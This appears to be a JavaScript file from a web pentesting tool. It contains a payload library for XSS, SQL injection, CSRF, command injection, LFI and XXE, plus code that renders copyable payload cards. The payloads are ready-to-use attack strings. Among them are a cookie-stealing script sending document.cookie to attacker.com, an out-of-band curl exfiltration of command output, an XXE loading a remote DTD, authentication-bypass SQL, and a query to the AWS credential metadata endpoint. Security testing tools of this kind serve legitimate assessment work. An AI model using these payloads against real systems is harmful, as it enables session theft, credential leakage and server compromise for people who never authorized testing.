// PAYLOADS
// ══════════════════════════════════════
const VULN_DESCS = {
  xss: { name:'Cross-Site Scripting (XSS)', desc:'XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script in the victim\'s session, enabling cookie theft, keylogging, or full account takeover. It is the #3 vulnerability in the OWASP Top 10.' },
  sqli: { name:'SQL Injection', desc:'SQL injection tricks a database into executing attacker-controlled commands. By inserting SQL syntax into input fields, attackers can dump entire databases, bypass authentication, or in some cases execute OS commands. Ranked #3 in OWASP Top 10.' },
  csrf: { name:'Cross-Site Request Forgery', desc:'CSRF tricks an authenticated user\'s browser into sending unintended requests to a target site. The attacker crafts a page that silently submits a form or makes a fetch request — the server receives it with the victim\'s valid cookies.' },
  cmdi: { name:'Command Injection', desc:'When user input is passed unsanitised to a system shell, attackers can append OS commands. This can lead to full server compromise, reverse shells, data exfiltration, or ransomware deployment.' },
  lfi: { name:'Local File Inclusion', desc:'LFI occurs when a web app includes local files based on user input without validation. Attackers can read sensitive files like /etc/passwd, application configs with credentials, or chain with log poisoning for code execution.' },
  xxe: { name:'XML External Entity (XXE)', desc:'When an XML parser processes external entity references in untrusted XML input, attackers can read local files, perform SSRF, or in some parsers achieve remote code execution. Affects any endpoint that processes XML.' },
};

const PAYLOADS = {
  xss: [
    { name:'Basic Alert', ctx:'basic', code:`<script>alert('XSS')</script>`, explain:'The most fundamental XSS test. If an alert box appears, the application is rendering your input as HTML without sanitisation.' },
    { name:'Image onerror', ctx:'basic', code:`<img src=x onerror=alert('XSS')>`, explain:'Triggers when the image src fails to load. Useful when script tags are filtered but HTML attributes are not.' },
    { name:'SVG onload', ctx:'filter', code:`<svg onload=alert('XSS')>`, explain:'SVG elements support JavaScript events. Often bypasses filters that only look for <script> tags.' },
    { name:'JavaScript URI', ctx:'filter', code:`javascript:alert('XSS')`, explain:'Used in href or src attributes. Executes when the link is clicked. Bypasses some tag-based filters.' },
    { name:'Double Encoding', ctx:'filter', code:`%253Cscript%253Ealert('XSS')%253C%252Fscript%253E`, explain:'URL-encodes the payload twice. The server decodes once, the browser decodes again. Bypasses single-decode filters.' },
    { name:'Cookie Stealer', ctx:'blind', code:`<script>fetch('https://attacker.com/?c='+document.cookie)</script>`, explain:'Exfiltrates session cookies to an attacker-controlled server. Only works if CSP does not block external requests.' },
    { name:'DOM Sink', ctx:'blind', code:`#<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, explain:'Base64-encodes the payload to evade WAF keyword filters. eval(atob()) decodes and executes at runtime.' },
  ],
  sqli: [
    { name:`Basic OR Bypass`, ctx:'basic', code:`' OR '1'='1`, explain:'Classic authentication bypass. If the query is SELECT * FROM users WHERE password=\'INPUT\', this always returns true.' },
    { name:`Comment Bypass`, ctx:'basic', code:`admin'--`, explain:'The -- comments out the rest of the SQL query. Combined with a known username, this bypasses password checks.' },
    { name:`UNION Select`, ctx:'basic', code:`' UNION SELECT null,username,password FROM users--`, explain:'UNION allows appending a second query. Used to extract data from other tables. Column count must match.' },
    { name:`Error-Based`, ctx:'filter', code:`' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`, explain:'Forces a SQL type conversion error that reveals data in the error message. Useful for data extraction without UNION.' },
    { name:`Time-Based Blind`, ctx:'blind', code:`'; IF (1=1) WAITFOR DELAY '0:0:5'--`, explain:'If the response is delayed 5 seconds, the condition is true. Used to extract data one bit at a time when no output is visible.' },
    { name:`Boolean Blind`, ctx:'blind', code:`' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--`, explain:'Returns true/false based on a condition. By iterating over characters, the full value can be extracted.' },
  ],
  csrf: [
    { name:'HTML Form', ctx:'basic', code:`<form action="https://target.com/transfer" method="POST">\n  <input type="hidden" name="to" value="attacker">\n  <input type="hidden" name="amount" value="1000">\n</form>\n<script>document.forms[0].submit()</script>`, explain:'Auto-submits a form when the victim visits the attacker page. Sends the request with the victim\'s cookies attached by the browser.' },
    { name:'Image GET', ctx:'basic', code:`<img src="https://target.com/logout">`, explain:'A GET request masquerading as an image load. If the target endpoint triggers actions via GET, this executes silently.' },
    { name:'Fetch CSRF', ctx:'filter', code:`fetch('https://target.com/api/action',{method:'POST',credentials:'include',body:'data=evil'})`, explain:'Modern fetch-based CSRF. credentials:include sends cookies. Only works if CORS policy is misconfigured.' },
    { name:'Token Bypass (Referer)', ctx:'filter', code:`<meta name="referrer" content="no-referrer">`, explain:'Strips the Referer header from the request. If the server validates Referer instead of a CSRF token, this bypasses it.' },
  ],
  cmdi: [
    { name:'Basic Injection', ctx:'basic', code:`; ls -la`, explain:'Appends a second command after a semicolon. If the input is passed to a shell, both commands execute.' },
    { name:'Pipe Injection', ctx:'basic', code:`| whoami`, explain:'Pipes output of the injected command. The application shows whoami output if vulnerable.' },
    { name:'Backtick Execution', ctx:'filter', code:'`id`', explain:'Backticks execute a subshell in bash. The result is substituted into the command.' },
    { name:'Blind OOB', ctx:'blind', code:`; curl https://attacker.com/$(whoami)`, explain:'Exfiltrates command output out-of-band via a DNS/HTTP callback. Used when output is not returned in response.' },
    { name:'Windows Injection', ctx:'basic', code:`& whoami`, explain:'Windows command separator. Works on IIS or Windows-based servers.' },
  ],
  lfi: [
    { name:'Basic Path Traversal', ctx:'basic', code:`../../../etc/passwd`, explain:'Traverses up the directory tree to reach /etc/passwd. Classic LFI test on Linux servers.' },
    { name:'Null Byte', ctx:'filter', code:`../../../etc/passwd%00`, explain:'Null byte truncates the string in C-based languages. Bypasses extensions appended by the application (e.g. file.php).' },
    { name:'Double Encoding', ctx:'filter', code:`..%252F..%252F..%252Fetc%252Fpasswd`, explain:'Double URL encodes the slash. Bypasses single-decode path filters.' },
    { name:'Windows Path', ctx:'basic', code:`..\\..\\..\\windows\\win.ini`, explain:'Windows equivalent. Reads win.ini as a proof-of-concept file.' },
    { name:'Log Poisoning', ctx:'blind', code:`/var/log/apache2/access.log`, explain:'If you can control a header that gets logged (e.g. User-Agent), poisoning the log with PHP then including it gives RCE.' },
  ],
  xxe: [
    { name:'Basic XXE', ctx:'basic', code:`<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>`, explain:'Defines an external entity pointing to /etc/passwd. If the parser resolves it, the file contents are included in the response.' },
    { name:'SSRF via XXE', ctx:'filter', code:`<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<root>&xxe;</root>`, explain:'Points the entity at the AWS metadata endpoint. Leaks IAM credentials and instance data in cloud environments.' },
    { name:'Blind OOB XXE', ctx:'blind', code:`<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>\n<root>test</root>`, explain:'Loads a remote DTD that contains parameter entities to exfiltrate data out-of-band, when errors are suppressed.' },
  ],
};

function renderPayloads() {
  const cat = document.getElementById('payloadCategory').value;
  const ctx = document.getElementById('payloadContext').value;
  const payloads = PAYLOADS[cat]?.filter(p => ctx === 'all' || p.ctx === ctx) || [];

  const v = VULN_DESCS[cat];
  document.getElementById('vulnDesc').innerHTML = `<strong style="color:var(--text);font-family:var(--head);font-size:14px;letter-spacing:1px">${v.name}</strong><br><br>${v.desc}`;

  const list = document.getElementById('payloadList');
  if (!payloads.length) {
    list.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text3);font-family:var(--mono);font-size:11px">// no payloads for this context filter</div>';
    return;
  }

  list.innerHTML = payloads.map((p, i) => `
    <div class="payload-card" id="pl_${i}">
      <div class="payload-header" onclick="document.getElementById('pl_${i}').classList.toggle('open')">
        <span class="badge badge-${p.ctx==='basic'?'ok':p.ctx==='filter'?'medium':'high'}" style="font-size:9px">${p.ctx}</span>
        <span class="payload-title">${p.name}</span>
        <button class="btn btn-ghost btn-sm" onclick="event.stopPropagation();addToReport(null,'${p.name} (${cat.toUpperCase()})','medium')">+ Report</button>
      </div>
      <div class="payload-body">
        <div class="payload-code">${escHtml(p.code)}<button class="payload-copy" onclick="copyPayload(this,'${encodeURIComponent(p.code)}')">COPY</button></div>
        <div class="payload-explain">${p.explain}</div>
        <div class="payload-warn">⚠ Only use against systems you own or have written permission to test.</div>
      </div>
    </div>
  `).join('');
}

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function copyPayload(btn, encoded) {
  navigator.clipboard.writeText(decodeURIComponent(encoded)).then(() => {
    btn.textContent = 'COPIED!';
    setTimeout(() => btn.textContent = 'COPY', 1500);
    toast('Payload copied to clipboard.');
    state.payloadsGenerated++;
  });
}

function addAllToReport() {
  const cat = document.getElementById('payloadCategory').value;
  const payloads = PAYLOADS[cat] || [];
  payloads.forEach(p => addToReport(null, `${p.name} (${cat.toUpperCase()})`, 'medium'));
  toast(`${payloads.length} payloads added to report.`);
}

